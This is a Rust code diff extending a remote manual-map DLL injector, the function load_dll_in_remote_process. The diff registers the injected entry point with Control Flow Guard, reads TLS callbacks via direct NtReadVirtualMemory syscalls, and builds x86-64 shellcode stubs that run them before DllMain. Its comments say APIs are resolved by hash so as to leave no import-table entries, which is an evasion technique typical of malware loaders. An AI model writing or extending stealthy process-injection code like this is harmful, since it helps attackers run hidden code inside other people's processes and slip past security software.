@@ -1666,6 +1666,85 @@ pub unsafe fn load_dll_in_remote_process(
         protect_remote(&mut target, &mut size, protect, &mut old)?;
     }
 
+    // ── Step 3c: register entry point as a valid CFG call target ──────────
+    // When the target process has Control Flow Guard (CFG) enabled, indirect
+    // calls to addresses not in the CFG bitmap trigger STATUS_STACK_BUFFER_OVERRUN
+    // (0xC0000409) and terminate the process.  Since the injected DLL is not
+    // loaded through the official loader, its entry point and exported functions
+    // are not in the CFG valid-call-target set.  We use
+    // SetProcessValidCallTargets (available on Windows 10+) to add the entry
+    // point to the bitmap, preventing CFG-induced crashes.
+    //
+    // The function is resolved dynamically from kernelbase.dll via pe_resolve
+    // (hash-based API resolution) to avoid adding IAT entries.  On older
+    // Windows versions where the function is absent, this step is skipped
+    // silently — those systems don't enforce CFG at kernel level anyway.
+    #[cfg(target_arch = "x86_64")]
+    {
+        let kernelbase = pe_resolve::get_module_handle_by_hash(
+            pe_resolve::hash_str(b"kernelbase.dll\0"),
+        );
+        if let Some(base) = kernelbase {
+            let fn_addr = pe_resolve::get_proc_address_by_hash(
+                base,
+                pe_resolve::hash_str(b"SetProcessValidCallTargets\0"),
+            );
+            if let Some(addr) = fn_addr {
+                // BOOL SetProcessValidCallTargets(
+                //   HANDLE hProcess,
+                //   PVOID  VirtualAddress,
+                //   SIZE_T RegionSize,
+                //   ULONG  NumberOfOffsets,
+                //   PCFG_CALL_TARGET_INFO OffsetInformation
+                // );
+                type SetProcessValidCallTargetsFn = unsafe extern "system" fn(
+                    *mut c_void, // HANDLE hProcess
+                    *mut c_void, // PVOID VirtualAddress
+                    usize,       // SIZE_T RegionSize
+                    u32,         // ULONG NumberOfOffsets
+                    *const CfgCallTargetInfo, // PCFG_CALL_TARGET_INFO
+                ) -> i32; // BOOL
+
+                #[repr(C)]
+                struct CfgCallTargetInfo {
+                    offset: usize,
+                    flags: usize,
+                }
+
+                const CFG_CALL_TARGET_VALID: usize = 0x00000001;
+                const CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID: usize = 0x00000004;
+
+                let entry_rva = opt.standard_fields.address_of_entry_point as usize;
+                let call_target_info = CfgCallTargetInfo {
+                    offset: entry_rva,
+                    flags: CFG_CALL_TARGET_VALID
+                        | CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID,
+                };
+
+                let set_cfg_targets: SetProcessValidCallTargetsFn =
+                    std::mem::transmute(addr);
+                let result = unsafe {
+                    set_cfg_targets(
+                        target_process as *mut c_void,
+                        remote_base,
+                        image_size,
+                        1,
+                        &call_target_info,
+                    )
+                };
+                if result == 0 {
+                    tracing::debug!(
+                        "remote_manual_map: SetProcessValidCallTargets returned FALSE \
+                         (entry_rva={:#x}); CFG may not be enabled or access denied",
+                        entry_rva
+                    );
+                }
+            }
+            // If SetProcessValidCallTargets is not available (pre-Win10),
+            // CFG enforcement is not present, so no action needed.
+        }
+    }
+
     // ── Step 4a: compute and apply base relocations ────────────────────────
     // All patches are computed in a local buffer then written remotely.
     let base_delta = remote_base as isize - preferred_base;
@@ -1842,6 +1921,83 @@ pub unsafe fn load_dll_in_remote_process(
         image_size as u64,
     );
 
+    // ── Step 4d: collect TLS callback addresses from the remote image ────
+    // After relocation the TLS directory's AddressOfCallBacks field points to
+    // a null-terminated array of function VAs inside the mapped image.  We
+    // read the array from the remote process so the shellcode stub can call
+    // each callback with DLL_PROCESS_ATTACH before DllMain.
+    //
+    // IMAGE_DIRECTORY_ENTRY_TLS = 9
+    const IMAGE_DIRECTORY_ENTRY_TLS_REMOTE: usize = 9;
+    let mut tls_callback_vas: Vec<usize> = Vec::new();
+    #[cfg(target_arch = "x86_64")]
+    {
+        if let Some(tls_entry) =
+            opt.data_directories.data_directories[IMAGE_DIRECTORY_ENTRY_TLS_REMOTE]
+        {
+            if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
+                // IMAGE_TLS_DIRECTORY64 layout (40 bytes on x64):
+                //   StartAddressOfRawData  : u64  (offset 0)
+                //   EndAddressOfRawData    : u64  (offset 8)
+                //   AddressOfIndex         : u64  (offset 16)
+                //   AddressOfCallBacks     : u64  (offset 24)
+                //   SizeOfZeroFill         : u32  (offset 32)
+                //   Characteristics        : u32  (offset 36)
+                let tls_dir_va = remote_base as usize + tls_entry.virtual_address as usize;
+                let mut tls_dir_buf = [0u8; 40];
+                let mut n = 0usize;
+                let read_status = nt_syscall::syscall!(
+                    "NtReadVirtualMemory",
+                    target_process as u64,
+                    tls_dir_va as u64,
+                    tls_dir_buf.as_mut_ptr() as u64,
+                    40u64,
+                    &mut n as *mut _ as u64,
+                );
+                if read_status.map_or(false, |s| s >= 0) && n == 40 {
+                    let callbacks_va = u64::from_le_bytes(
+                        tls_dir_buf[24..32].try_into().unwrap(),
+                    ) as usize;
+                    if callbacks_va != 0 {
+                        // Walk the null-terminated callback array.
+                        let mut remaining = 32u32; // defensive cap
+                        let mut slot_ptr = callbacks_va as *const u64;
+                        loop {
+                            if remaining == 0 {
+                                break;
+                            }
+                            remaining -= 1;
+                            let mut cb_buf = [0u8; 8];
+                            let mut cb_read = 0usize;
+                            let s = nt_syscall::syscall!(
+                                "NtReadVirtualMemory",
+                                target_process as u64,
+                                slot_ptr as u64,
+                                cb_buf.as_mut_ptr() as u64,
+                                8u64,
+                                &mut cb_read as *mut _ as u64,
+                            );
+                            if s.map_or(true, |st| st < 0) || cb_read != 8 {
+                                break;
+                            }
+                            let cb_va = u64::from_le_bytes(cb_buf) as usize;
+                            if cb_va == 0 {
+                                break;
+                            }
+                            // Validate: callback must lie within the mapped image.
+                            if cb_va >= remote_base as usize
+                                && cb_va < remote_base as usize + image_size
+                            {
+                                tls_callback_vas.push(cb_va);
+                            }
+                            slot_ptr = slot_ptr.add(1);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
     // ── Step 5: invoke DllMain via a shellcode stub ───────────────────────
     // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
     // CreateRemoteThread only passes a single LPVOID parameter, so calling the
@@ -1849,7 +2005,8 @@ pub unsafe fn load_dll_in_remote_process(
     // a small position-independent x86-64 stub that:
     //
     //   (a) calls RtlAddFunctionTable to register .pdata if present, then
-    //   (b) sets up the correct calling-convention arguments and calls DllMain.
+    //   (b) calls each TLS callback (if any) with DLL_PROCESS_ATTACH, then
+    //   (c) sets up the correct calling-convention arguments and calls DllMain.
     let entry_rva = opt.standard_fields.address_of_entry_point as usize;
     if entry_rva != 0 {
         let entry_va = remote_base as usize + entry_rva;
@@ -1952,6 +2109,13 @@ pub unsafe fn load_dll_in_remote_process(
         //   mov rax, <RtlAddFunctionTable_addr>
         //   call rax                     ; BOOLEAN result (ignored)
         //
+        //   ; --- TLS callbacks (if any) ---
+        //   mov rcx, <remote_base>       ; hinstDLL
+        //   mov edx, 1                   ; DLL_PROCESS_ATTACH
+        //   xor r8d, r8d                 ; lpvReserved = NULL
+        //   mov rax, <callback_va>       ; TLS callback address
+        //   call rax                     ; (repeat for each callback)
+        //
         //   ; --- DllMain invocation ---
         //   mov rcx, <remote_base>       ; HINSTANCE hinstDLL
         //   mov edx, 1                   ; DLL_PROCESS_ATTACH
@@ -1959,7 +2123,7 @@ pub unsafe fn load_dll_in_remote_process(
         //   mov rax, <entry_va>          ; entry point address
         //   call rax
         //   ret
-        let mut stub: Vec<u8> = Vec::with_capacity(60);
+        let mut stub: Vec<u8> = Vec::with_capacity(128);
 
         #[cfg(target_arch = "x86_64")]
         {
@@ -1977,6 +2141,23 @@ pub unsafe fn load_dll_in_remote_process(
                 // mov rax, RtlAddFunctionTable_addr  (movabs rax, imm64)
                 stub.extend_from_slice(&[0x48, 0xB8]);
                 stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
+                // call rax
+                stub.extend_from_slice(&[0xFF, 0xD0]);
+            }
+
+            // Emit TLS callback invocations before DllMain.
+            // Each callback: TlsCallback(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+            for &cb_va in &tls_callback_vas {
+                // mov rcx, remote_base       (hinstDLL)
+                stub.extend_from_slice(&[0x48, 0xB9]);
+                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
+                // mov edx, 1                 (DLL_PROCESS_ATTACH)
+                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+                // xor r8d, r8d               (lpvReserved = NULL)
+                stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
+                // mov rax, cb_va             (callback address)
+                stub.extend_from_slice(&[0x48, 0xB8]);
+                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                 // call rax
                 stub.extend_from_slice(&[0xFF, 0xD0]);
             }
